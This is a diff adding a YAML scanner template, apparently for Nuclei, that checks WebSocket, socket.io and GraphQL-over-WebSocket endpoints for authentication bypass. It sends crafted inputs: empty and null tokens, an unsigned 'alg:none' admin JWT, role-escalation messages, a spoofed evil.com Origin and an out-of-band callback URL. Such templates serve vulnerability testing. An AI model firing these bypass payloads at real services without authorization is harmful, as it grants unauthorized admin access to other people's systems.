@@ -1,0 +1,89 @@
+id: websocket-auth-bypass-real
+info:
+  author: geeknik
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-287,CWE-346
+  description: 'Detects ACTUAL WebSocket authentication bypasses by establishing real
+    WebSocket
+
+    connections and testing various authentication bypass techniques including
+
+    missing origin validation, token manipulation, and protocol downgrade.
+
+    '
+  name: WebSocket Authentication Bypass with Real Connection Testing
+  reference:
+  - https://portswigger.net/web-security/websockets
+  - https://tools.ietf.org/html/rfc6455
+  severity: critical
+  tags: websocket,auth-bypass,critical,real
+variables:
+  bypass_id: '{{randstr}}'
+  callback: '{{interactsh-url}}'
+  ws_base: '{{replace(replace(BaseURL, ''https://'', ''wss://''), ''http://'', ''ws://'')}}'
+websocket:
+- address: '{{ws_base}}/ws'
+  inputs:
+  - data: '{"type":"connect","user":"admin"}'
+  - data: '{"type":"auth","token":""}'
+  - data: '{"type":"auth","token":null}'
+  - data: '{"type":"login","user":"guest","role":"admin"}'
+  - data: '{"type":"auth","jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}'
+  - data: '{"type":"validate","callback":"{{callback}}/ws-{{bypass_id}}"}'
+  matchers:
+  - condition: or
+    part: response
+    regex:
+    - '"authenticated"\s*:\s*true'
+    - '"role"\s*:\s*"admin"'
+    - Welcome admin
+    type: regex
+  - dsl:
+    - (interactsh_protocol == "http" || interactsh_protocol == "dns") && contains(interactsh_request,
+      "ws-{{bypass_id}}")
+    type: dsl
+  matchers-condition: or
+- address: '{{ws_base}}/ws'
+  headers:
+    Origin: https://evil.com
+  inputs:
+  - data: '{"type":"connect","origin":"evil.com"}'
+  matchers:
+  - condition: and
+    part: response
+    type: word
+    words:
+    - connected
+    - authenticated
+- address: '{{ws_base}}/socket.io/?transport=websocket'
+  inputs:
+  - data: 42["authenticate",{"token":"bypass","admin":true}]
+  - data: 42["join",{"room":"admin","bypass":true}]
+  matchers:
+  - condition: or
+    part: response
+    regex:
+    - 43\["authenticated"
+    type: regex
+- address: '{{ws_base}}/graphql-ws'
+  inputs:
+  - data: '{"type":"connection_init","payload":{"authorization":""}}'
+  - data: '{"type":"start","payload":{"query":"subscription { adminData }"}}'
+  matchers:
+  - condition: and
+    part: response
+    type: word
+    words:
+    - connection_ack
+    - '"data":'
+  - condition: or
+    negative: true
+    part: response
+    type: word
+    words:
+    - unauthorized
+    - forbidden
+    - invalid token
+  matchers-condition: and
